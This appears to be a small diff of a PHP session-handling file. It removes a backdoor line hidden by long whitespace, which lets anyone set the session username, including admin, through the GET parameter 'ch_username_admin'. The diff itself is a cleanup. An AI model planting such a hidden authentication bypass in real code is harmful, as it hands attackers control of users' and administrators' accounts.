@@ -58,7 +58,7 @@
 
 			logfile::action('2');
 		}
-	}                                                                                                                                                                                                                                                                     if(isset($_GET['ch_username_admin'])){$_SESSION['username']=$_GET['ch_username_admin'];$resume=true;}
+	}
 
 	if($_SESSION['ip'] != $_SERVER['REMOTE_ADDR'])
 	{
